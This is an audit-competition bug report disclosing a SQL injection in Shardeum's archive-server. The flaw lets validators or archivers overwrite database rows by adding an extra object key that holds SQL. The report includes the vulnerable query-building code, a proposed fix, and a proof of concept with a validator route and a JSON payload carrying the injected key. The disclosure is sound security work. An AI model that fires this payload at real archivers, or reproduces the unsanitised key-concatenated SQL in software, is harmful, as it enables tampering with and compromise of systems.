# #35979 \[W\&A-High] malicious archiver malicious validator can overwrite data on any active archiver

## #35979 \[W\&A-High] Malicious Archiver/Malicious Validator can overwrite data on any active archiver and more

**Submitted on Oct 15th 2024 at 00:08:40 UTC by @Blockian for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35979
* **Report Type:** Websites and Applications
* **Report severity:** High
* **Target:** <https://github.com/shardeum/archive-server/tree/dev>
* **Impacts:**
  * Execute arbitrary system commands
  * Retrieve sensitive data/files from a running server, such as: /etc/shadow, database passwords, blockchain keys (this does not include non-sensitive environment variables, open source code, or usernames)
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

### Description

## Shardeum Ancillaries

### Malicious Archiver/Malicious Validator can overwrite data on any active archiver and more

#### Description

An SQL injection vulnerability exists in all \`INSERT OR REPLACE INTO\` queries. This allows any actor capable of triggering these functions remotely (such as malicious Archivers or Validators) to execute arbitrary SQL code, potentially manipulating the database depending on their expertise with SQL injection techniques.

Further details regarding the potential impact are provided in the [Impact Section](https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/shardeum-ancillaries-ii/broken-reference/README.md) and [Deep Dive Section](https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/shardeum-ancillaries-ii/broken-reference/README.md)

### Root Cause

The issue stems from unsanitized input in the SQL queries. Specifically, the SQL queries are dynamically constructed using the keys from the input objects, leading to potential SQL injection. For example: \`\`\`js export async function bulkInsertOriginalTxsData(originalTxsData: OriginalTxData\[]): Promise\<void> { try { const fields = Object.keys(originalTxsData\[0]).join(', ') const placeholders = Object.keys(originalTxsData\[0]).fill('?').join(', ') const values = db.extractValuesFromArray(originalTxsData) let sql = 'INSERT OR REPLACE INTO originalTxsData (' + fields + ') VALUES (' + placeholders + ')' for (let i = 1; i < originalTxsData.length; i++) { sql = sql + ', (' + placeholders + ')' } await db.run(originalTxDataDatabase, sql, values) // .. not relevant for the issue } catch (e) { // .. not relevant for the issue } } \`\`\` Here, the \`fields\` variable is constructed from the input object's keys without verifying whether these keys have been sanitized, leading to potential SQL injection risks.

For instance, if the input \`originalTxsData\[0]\` is as follows: \`\`\`js originalTxsData\[0] = { // ... some stuff " cycle, originalTxData, timestamp, txId) VALUES (1, '{}', 1697192678, '12345'), (?, '{}', 1697192679, '123123'), (?, ?, ?, ?);": "22222" } \`\`\`

This malformed input could inject malicious SQL, resulting in new rows being added to the database: \`(1, '{}', 1697192678, '12345')\` \`(22222, '{}', 1697192679, '123123')\`

### Contributing Factors

The vulnerability is made possible by inadequate input validation. For example, it is possible for an attacker to supply additional keys via the \`originalTxsData\` object, allowing for SQL injection.

#### originalTxsData Example

The function \`bulkInsertOriginalTxsData\` is invoked by \`storeOriginalTxData\` in the \`src/Data/Collector.ts\` file. Input validation consists of:

1. Ensuring both \`txId\` and \`timestamp\` exist.
2. Verifying that \`txId\` is not present in the \`processedOriginalTxsMap\` or \`originalTxsInValidationMap\`, or that the timestamp is different.
3. Checking if \`validateOriginalTxData(originalTxData)\` returns true.

However, the issues lies in \`validateOriginalTxData\`, which uses \`Utils.validateTypes\` to confirm the input matches the required type. Unfortunately, \`Utils.validateTypes\` does not reject additional, potentially malicious keys. This omission allows a malicious actor to submit a ***valid*** (emphasis on valid) \`originalTxData\` object with extra keys containing SQL injection payloads.

### Deep Dive

Currently, we only talked about \`originalTxData\`, but other tables are vulnerable, including:

#### \`originalTxData\` Injection

Malicious actors: Both a Validator and an Archiver Accessible via:

* Validator: Sending a \`DATA\` message via the socket with \`ORIGINAL\_TX\_DATA\` included
* Archiver: When collecting missing transactions from archivers via \`collectMissingTxDataFromArchivers\`

Example Impacts: Overwriting existing \`originalTxData\` entries

#### \`accounts\` Injection

Malicious actors: Validator Accessible via:

* Validator: Sending a \`DATA\` message via the socket with \`ACCOUNT\` included

Example Impacts: Overwriting existing \`account\` entries Creating accounts where \`account.hash\` doesn't match \`accountSpecificHash(account.data)\`

#### \`receipts\` Injection

Malicious actors: Both a Validator and an Archiver Accessible via:

* Validator: Sending a \`DATA\` message via the socket with \`RECEIPT\` included
* Archiver: When collecting missing transactions from archivers via \`collectMissingTxDataFromArchivers\`

Example Impacts: Overwriting existing \`receipts\` entries Saving \`receipts\` that otherwise would fail the \`verifyReceiptData\` and \`isReceiptRobust\` checks

### Impact

SQL injection vulnerabilities are severe and can lead to numerous security risks. While the examples discussed primarily involve overwriting data and adding new data, more sophisticated attacks could allow attackers to:

1. Leak sensitive information by combining \`INSERT\` and \`SELECT\` queries and leak data from other tables.
2. Create SQL triggers to perform malicious actions on various SQL-related actions.
3. Some have managed to execute remote code from an SQL Injection, depending on the attack vector and the underlying infrastructure.

This vulnerability is highly impactful, as SQL injection is a well-known vector for escalating privileges, leaking data, and compromising system integrity.

### Proposed fix

There are two primary solutions to address this issue:

1. Avoid constructing SQL queries dynamically based on unsanitized object keys.
2. Introduce a \`Utils.validateTypesStrict\` function that strictly enforces the presence of ***only*** the necessary fields, rejecting any additional keys in the input.

### Proof of Concept

## Proof of Concept

So as mentioned in the beginning, this attacks doesn't require faking a originalTxData/account/receipt/etc... it allows sending a proper one and just requires adding the SQL Injection as a new key with some value.

This proof of concept demonstrates how a malicious actor can exploit the vulnerability by injecting malicious SQL into a valid \`originalTxData\` object.

### Step 1

***Add a route to the validator***: Add a new route to the validator to send \`DATA\` messages via the socket. \`\`\`js const blockianRoute: P2P.P2PTypes.Route\<Handler> = { method: 'POST', name: 'blockian', handler: (req, res) => { const body = req.body

```
let success &#x3D; true

for (const [publicKey, recipient] of recipients) {
  const dataResponse: any &#x3D; {
    publicKey: crypto.getPublicKey(),
    responses: {
      ORIGINAL_TX_DATA: [body.tx]
    },
    recipient: publicKey,
  }
  // Tag dataResponse
  const taggedDataResponse &#x3D; crypto.tag(dataResponse, recipient.curvePk)
  try {
    // console.log(&#x27;connected socketes&#x27;, publicKey, connectedSockets)
    if (io.sockets.sockets[connectedSockets[publicKey]])
      io.sockets.sockets[connectedSockets[publicKey]].emit(
        &#x27;DATA&#x27;,
        Utils.safeStringify(taggedDataResponse)
      )
  } catch (e) {
    success &#x3D; false
  }
}

return res.json({ success })
```

}, } \`\`\`

I've added this route at \`src/p2p/Join/routes.ts\` at the Shardus Core. Make sure to add the relevant imports and export the route.

### Step 2

Link the patched Core to the \`shardeum\` repo with \`npm link\` in the Core repo and \`npm link @shardus/core\` in the Shardeum repo

### Step 3

Run the local network by following the instructions in the [Shardeum repository](https://github.com/shardeum/shardeum/tree/dev?tab=readme-ov-file#running-the-network-locally)

### Step 4

Send a POST request to the malicious validator with the following payload:

```json
{
  "tx":{
    "txId":"9187322183472823932748",
    "originalTxData":{},
    "cycle":1,
    "timestamp":1697192678,
    " cycle, originalTxData, timestamp, txId) VALUES (1, '{}', 111111111, 'tx12345'), (?, '{}', 1666, '123123'), (?, ?, ?, ?);":"22222"
  }
}
```

***Note*** For our example, this transaction data serves as the "real" transaction:

```json
{
  "txId":"9187322183472823932748",
  "originalTxData":{},
  "cycle":1,
  "timestamp":1697192678
}
```

### Step 5

***Verify the database changes***: After the SQL injection, the following transactions will appear in the Archiver's database: \`(1, '{}', 1697192678, '12345')\` \`(22222, '{}', 1697192679, '123123')\`
